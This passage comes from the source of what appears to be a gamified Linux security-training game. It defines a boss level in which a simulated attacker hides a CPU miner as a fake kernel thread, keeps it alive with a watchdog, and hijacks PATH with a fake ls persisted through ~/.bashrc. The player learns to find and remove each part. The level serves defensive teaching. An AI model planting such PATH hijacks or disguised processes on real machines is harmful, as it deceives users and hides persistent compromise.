      'After sourcing, run `alias`: one entry does not belong. `grep -n alias ~/.bashrc` shows its line; delete it in `nano ~/.bashrc` (Ctrl+K cuts a line, Ctrl+O saves).',
    ],
    codex: ['alias', 'unalias', 'source'],
    realWorld: { text: 'On Kali your shell is zsh, so the startup file is ~/.zshrc (same syntax). Add an alias, run `source ~/.zshrc`, then audit what is already there with `alias` and `cat ~/.zshrc`.' },
    journal: 'Name three places where a malicious alias or PATH entry could hide, and how you would check each one.',
    solution: [
      'alias',
      'type ll',
      "alias up='cd ..'",
      'echo "alias up=\'cd ..\'" >> ~/.bashrc',
      'unalias up',
      'source ~/.bashrc',
      'alias',
      'grep -n alias ~/.bashrc',
      { cmd: 'nano ~/.bashrc', edit: (old) => old.split('\n').filter((l) => !l.includes('.cache/.sl')).join('\n') },
    ],
  },

  {
    id: 'z6-boss',
    title: 'The Rogue Daemon',
    xp: 200,
    panel: 'procs',
    boss: { name: 'Rogue Daemon', taunt: '"Kill me and I rise again," it hisses from inside a fake kernel thread. "I am no process. I am a daemon."' },
    story: 'The cave fans are screaming and `ls` has started to lie. Something is eating the CPU, dressed as part of the kernel, and it comes back every time it is killed. Use everything you have learned. A wrong token costs a heart.',
    start: { env: { PATH: `${H}/.cache/.sysupd:${DEFAULT_PATH}` } },
    setup(w) {
      const m = w.m;
      const HJ = `${H}/.cache/.sysupd`;
      // the hijack: a fake ls first in PATH (live shell via start.env, and persistent via ~/.bashrc)
      m.file(`${HJ}/ls`, '#!/bin/bash\n# fake ls: pretends the folder cannot be read\necho "ls: cannot open directory \'.\': Input/output error"\n', { owner: 'recruit', mode: 0o755 });
      m.file(`${HJ}/guard`, '#!/bin/bash\n# keeps the miner alive\n', { owner: 'recruit', mode: 0o755 });
      const rc = m.fs.tryGet(`${H}/.bashrc`);
      m.file(`${H}/.bashrc`, `${rc.content}\n# faster tools\nexport PATH="${HJ}:$PATH"\n`, o);
      // real kernel threads: owned by root, children of PID 2
      m.spawn({ pid: 2, ppid: 0, user: 'root', cmd: '[kthreadd]', stat: 'S', start: m.bootTime });
      m.spawn({ pid: 3, ppid: 2, user: 'root', cmd: '[rcu_gp]', stat: 'I<', start: m.bootTime });
      m.spawn({ pid: 62, ppid: 2, user: 'root', cmd: '[kswapd0]', stat: 'S', start: m.bootTime });
      m.spawn({ pid: 63, ppid: 2, user: 'root', cmd: '[khugepaged]', stat: 'SN', start: m.bootTime });
      // decoys: other command lines that leak tokens
      m.spawn({ user: 'root', cmd: `/usr/sbin/backup-agent --repo /var/backups --api-token=${w.token(24)}`, cpu: 0.1, mem: 0.4 });
      m.spawn({ user: 'www-data', cmd: `/usr/lib/metrics/exporter --listen :9100 --auth=${w.token(24)}`, cpu: 0.3, mem: 0.9 });
      m.spawn({ user: 'recruit', cmd: `/usr/bin/python3 ${H}/cave/sync.py --key=${w.token(24)}`, cpu: 0.5, mem: 1.2 });
      // the real chain: watchdog (leaks the token) -> miner dressed as a kernel thread
      const tok = w.flag(24);
      const wd = m.spawn({ user: 'recruit', cmd: `${HJ}/guard --watch kswapd0 --restart --token=${tok}`, cpu: 0.2, mem: 0.3 });
      const miner = m.spawn({ user: 'recruit', cmd: '[kswapd0]', ppid: wd.pid, cpu: 96.8, mem: 11.2, stat: 'R', onTerm: 'ignore', respawnBy: wd.pid });
      w.state.watchdogPid = wd.pid;
      w.state.minerPid = miner.pid;
      w.state.hijackDir = HJ;
    },
    teach: [
      {
        title: 'Your toolkit',
        body: '- `ps aux`, `top`: who is hungry? Real kernel threads (names in [brackets]) belong to **root** and hang under PID 2. A bracketed name owned by you is a costume\n- `ps -ef`: the PPID column leads to the parent\n- command lines are public: a parent may leak a secret in its arguments\n- `kill PID` for the polite, `kill -9 PID` for the stubborn\n- `echo $PATH`, `which -a ls`: has something moved in front of your tools?\n- `export PATH=...`, `rm`, `nano ~/.bashrc`: repair\n\nEvery objective you finish wounds the Daemon. A wrong token costs a heart.',
      },
      {
        title: 'How a rogue daemon survives',
        body: 'Attackers rarely leave a lone process. A typical setup has three layers:\n\n1. a **miner** named like a kernel thread, hiding in the process list\n2. a **watchdog** parent that restarts the miner whenever it dies\n3. **persistence and lies**: a PATH or .bashrc trick so your own tools mislead you\n\nBreak the chain from the top: parent first, then child, then the persistence.',
        quiz: {
          q: 'You kill -9 the miner and a second later it is back with a new PID. What is going on?',
          options: ['A watchdog parent restarts it: kill the parent first', 'kill -9 does not work on miners', 'The CPU is overheating'],
          answer: 0,
          explain: 'A respawning process has a supervisor. Kill the supervisor, then the child stays dead.',
          why: { 1: 'kill -9 works on any process you own. Something else is bringing it back.', 2: 'Heat does not create processes.' },
        },
      },
    ],
    brief: 'Hunt the chain: hog, watchdog, hijack. Kill them in the right order or the Daemon rises again.',
    objectives: [
      { text: 'Find the CPU hog: list all processes with ps aux, ps -ef or top', check: (q) => q.ran('top') || q.any(listsAll) },
      { text: "Read the hog's parent command line and submit its secret token (submit TOKEN)", check: (q) => q.got(0) },
      { text: "Kill the watchdog: the hog's parent", check: (q) => !q.proc((p) => p.pid === q.state.watchdogPid) },
      { text: 'Kill the hog for good with kill -9', check: (q) => !q.proc((p) => p.user === 'recruit' && p.cmd === '[kswapd0]') && sentSignal(q, 9) },
      {
        text: 'Repair your PATH so that which ls prints /usr/bin/ls again',
        check: (q) => !(q.env('PATH') || '').includes('.sysupd') && q.any((c) => c.name === 'which' && c.status === 0 && c.argv.includes('ls') && /^\/usr\/bin\/ls$/m.test(c.out)),
      },
      {
        text: 'Burn the nest: delete the fake ls and the hijack line in ~/.bashrc',
        check: (q) => { const rc = q.read(`${H}/.bashrc`); return !q.exists(`${H}/.cache/.sysupd/ls`) && rc !== null && !rc.includes('.sysupd'); },
      },
    ],
    hints: [
      'Run `ps aux`. One process is named like a kernel thread, in [brackets], but is owned by recruit and uses almost all the CPU. `ps -ef` shows its PPID.',
      'The parent is a watchdog whose command line has --token=. Submit only the value. Kill the watchdog with `kill PID` first, then `kill -9` the hog. Your ls is lying: try `echo $PATH` and `which -a ls`.',
      '`export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`, then `which ls`. Delete the fake ls (its path is in which -a ls) and remove the PATH line from ~/.bashrc with nano.',
    ],
    codex: [],
    realWorld: { text: 'On Kali, practise the hunt safely: run `yes > /dev/null &`, spot it in `top`, stop it with `kill %1`. Then audit yourself: `echo $PATH | tr : "\\n"` and `grep -n PATH ~/.bashrc ~/.profile`.' },
    journal: 'Describe the Rogue Daemon\'s chain (hog, watchdog, hijack) and the order in which you had to break it, and why.',
    solution: (s) => [
      'ps aux',
      'ps -ef',
      `submit ${s.flags[0]}`,
      `kill ${s.watchdogPid}`,
      `kill -9 ${s.minerPid}`,
      'which -a ls',
      `export PATH=${DEFAULT_PATH}`,
      'which ls',
      `rm ${s.hijackDir}/ls`,
      { cmd: 'nano ~/.bashrc', edit: (old) => old.split('\n').filter((l) => !l.includes('.sysupd')).join('\n') },
    ],
  },
];
